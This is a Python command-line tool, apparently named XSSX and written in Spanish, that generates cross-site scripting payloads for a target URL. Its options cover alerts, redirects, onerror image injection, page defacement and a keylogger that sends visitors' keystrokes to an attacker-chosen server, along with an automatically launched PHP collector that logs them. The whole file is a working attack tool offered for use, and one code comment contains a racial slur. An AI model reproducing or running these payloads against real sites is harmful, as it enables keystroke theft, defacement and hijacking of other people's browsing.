import os
from colorama import *


inf = Fore.GREEN+'[\033[1m+\033[0m'+Fore.GREEN+'] '+Fore.RESET

menu = Fore.YELLOW+'''\033[1m------------------------------------------------------------------------------------------'''+Fore.RESET+'''
['''+Fore.RED+'''1'''+Fore.RESET+'''] Letras grandes simples (Basico) Constituye: html   ['''+Fore.RED+'''8'''+Fore.RESET+'''] Robo de cookies (proximamente)
['''+Fore.RED+'''2'''+Fore.RESET+'''] Mostrar alerta (Basico) Constituye: js
['''+Fore.RED+'''3'''+Fore.RESET+'''] Redireccion a otro sitio web
['''+Fore.RED+'''4'''+Fore.RESET+'''] Modificar evento OneError en una imagen (Alerta)
['''+Fore.RED+'''5'''+Fore.RESET+'''] Inyectar imagen mediante url
['''+Fore.RED+'''6'''+Fore.RESET+'''] KeyLogger (Se requiere de servidor)
['''+Fore.RED+'''7'''+Fore.RESET+'''] Deface Web
'''+Fore.YELLOW+'''-------------------------------------------------------------------------------------------\033[0m'''+Fore.RESET

usage = '''\033[1mEjemplo de uso: Opcion: '''+Fore.RED+'''http://example.com/vuln=(xss)'''+Fore.RESET+'''
Usar ('''+Fore.RED+'''xss'''+Fore.RESET+''') para la inyeccion de XSS
El programa reemplazara el (xss) Recuerda usar parentesis.\033[0m
'''

banner = Fore.RED+'''\033[1m
 /$$   /$$  /$$$$$$   /$$$$$$  /$$   /$$  '''+Fore.MAGENTA+'''Creado por 0xNerv
'''+Fore.RED+'''| $$  / $$ /$$__  $$ /$$__  $$| $$  / $$   '''+Fore.MAGENTA+'''Version '''+Fore.YELLOW+'''1.0'''+Fore.RED+'''
'''+Fore.RED+'''|  $$/ $$/| $$  \__/| $$  \__/|  $$/ $$/    '''+Fore.MAGENTA+'''Inyeccion XSS '''+'''
'''+Fore.RED+''' \  $$$$/ |  $$$$$$ |  $$$$$$  \  $$$$/ 
  >$$  $$  \____  $$ \____  $$  >$$  $$ 
 /$$/\  $$ /$$  \ $$ /$$  \ $$ /$$/\  $$
| $$  \ $$|  $$$$$$/|  $$$$$$/| $$  \ $$
|__/  |__/ \______/  \______/ |__/  |__/ \033[0m

'''+Fore.RESET

print (banner)
print (usage)

target = input('\033[1mObjetivo url: \033[0m')

print (inf+'Objetivo: \033[1m'+Fore.RED+target+Fore.RESET+'\033[0m')
print (inf+'\033[1mSeleccione el tipo de inyeccion\033[0m')
print (menu)

opcion = input('Opcion: ')

#h1inyection
if opcion == '1':
   print (inf+'Metodo de inyeccion: Letras grandes')
   print (inf+'Digite el texto')
   texto = input('Contenido: ')
   print (inf+'Reemplazando: (xss)')
   target = target.replace('(xss)','<h1>'+texto+'<h1>')
   print ('Inyeccion: \033[1m'+Fore.RED+target+Fore.RESET+'\033[0m')
   print ('')
   print ('Inyeccion normal para XSS Stored: \033[1m<h1>'+Fore.RED+texto+'</h1>\033[0m')
   print ('')

#Alerta
if opcion == '2':
   print (inf+'\033[1mMetodo de inyeccion: Alerta')
   print (inf+'\033[1mDigite el texto')
   texto = input('Contenido\033[0m: ')
   print (inf+'Reemplazando: (xss)')
   target = target.replace("(xss)","<script>alert('"+texto+"')</script>")
   print ('Inyeccion: \033[1m'+Fore.RED+target+Fore.RESET+'\033[0m')
   print ('')
   print ('Inyeccion normal para XSS Stored: \033[1m'+Fore.RED+"<script>alert('"+texto+"')</script>\033[0m"+Fore.RESET)
   print ('')

#Redireccion basica hacia otro sitio web
if opcion == '3':
   print (inf+'\033[1mMetodo de inyeccion: Redireccion')
   print (inf+'\033[1mDigite la url del sitio web')
   texto = input('Sitio web\033[0m: ')
   print (inf+'Reemplazando: (xss)')
   target = target.replace("(xss)","<script>window.location='"+texto+"';</script>")
   print ('Inyeccion: \033[1m'+Fore.RED+target+Fore.RESET+'\033[0m')
   print ('')
   print ('Inyeccion normal para XSS Stored: \033[1m'+Fore.RED+"<script>window.location='"+texto+"';</script>\033[0m"+Fore.RESET)
   print ('')

#oneerror inyection nigger
if opcion == '4':
   print (inf+'\033[1mMetodo de inyeccion: Modificar evento OneError (Imagen) con una alerta personalizada')
   print (inf+'\033[1mDigite la url del sitio web')
   texto = input('Contenido\033[0m: ')
   print (inf+'Reemplazando: (xss)')
   x = '"alert('+"'"+texto+"')"+'">'
   target = target.replace("(xss)","<img src='nonexistent.jpg' onerror="+x)
   print ('Inyeccion: \033[1m'+Fore.RED+target+Fore.RESET+'\033[0m')
   print ('')
   print ('Inyeccion normal para XSS Stored: \033[1m'+Fore.RED+"<img src='nonexistent.jpg' onerror="+x+'\033[0m'+Fore.RESET)
   print ('')

#Inyeccion de imagen
if opcion == '5':
   print (inf+'\033[1mMetodo de inyeccion: Inyectar imagen (Mediante url)')
   print (inf+'\033[1mDigite la url de la imagen')
   texto = input('Url imagen\033[0m: ')
   tamano = input('\033[1mTamaño de la imagen (Ej 4000)\033[0m: ')
   print (inf+'Reemplazando: (xss)')
   imginject = '<img src="'+texto+'" width="'+tamano+'" height="'+tamano+'">'
   target = target.replace("(xss)",imginject)
   print ('Inyeccion: \033[1m'+Fore.RED+target+Fore.RESET+'\033[0m')
   print ('')
   print ('Inyeccion normal para XSS Stored: \033[1m'+Fore.RED+imginject+Fore.RESET+'\033[0m')
   print ('')

#keylogger (se debe iniciar un servidor http)
if opcion == '6':
   phpkey = '''
<?php
if (isset($_GET['key'])) {
    $key = $_GET['key'];
    file_put_contents('keylogs.txt', $key . "\n", FILE_APPEND);
}
?>
'''
   print (inf+'\033[1mMetodo de inyeccion: Keylogger (Se usara un servidor)')
   print (inf+'\033[1mServidor al que se conectara (si es localhost ocupa el puerto EJ: 127.0.0.1:8080): ')
   servidor = input('\033[1mServidor\033[0m: ')
   print (inf+'Reemplazando: (xss)')
   print (inf+'Servidor => '+servidor)
   keylogger = target.replace("(xss)","<script>document.addEventListener('keypress',function(e){new Image().src='"+servidor+"/keylog?key='+e.key;});</script>")
   print ('Inyeccion: \033[1m'+Fore.RED+keylogger+Fore.RESET+'\033[0m')
   print ('')
   stored = "<script>document.addEventListener('keypress',function(e){new Image().src='http://"+servidor+"/keylog?key='+e.key;});</script>"
   print ('Inyeccion normal para XSS Stored: \033[1m'+Fore.RED+stored+Fore.RESET+'\033[0m')
   print ('')
   yn = input('Quieres crear un servidor PHP (Automatizado) si/no: ')
   if yn == 'si':
      print (inf+'Se iniciara un servidor PHP para la captura de datos')
      print (inf+'Escribiendo index.php ...')
      server = open('index.php','w')
      server.write(phpkey)
      server.close()
      print (inf+'Lo escrito se guardara en '+"'keylogs.txt'")
      print (inf+'Iniciando actividad en el puerto seleccionado')
      os.system('php -S '+servidor)
   else:
      print (inf+'Debes usar este php en tu servidor')
      print (phpkey)
      exit()

#Deface con posibilidad de ocupar imagen
if opcion == '7':
   print (inf+'\033[1mMetodo de inyeccion: Deface web')
   print (inf+'\033[1mDigite los input')
   texto = input('Primer texto\033[0m: ')
   tamano = input('\033[1mContenido\033[0m: ')
   imagen = input('\033[1mImagen (Default: No)\033[0m: ')
   if imagen == '':
      img = ''
   else:
      img = '<img src="'+imagen+'">'
   print (inf+'Reemplazando: (xss)')
   deface = "<script>document.body.innerHTML = '<h1>"+texto+"</h1><p>"+tamano+"</p>"+img+"';</script>"
   target = target.replace("(xss)",deface)
   print ('Inyeccion: \033[1m'+Fore.RED+target+Fore.RESET+'\033[0m')
   print ('')
   print ('Inyeccion normal para XSS Stored: \033[1m'+Fore.RED+deface+Fore.RESET+'\033[0m')
   print ('')


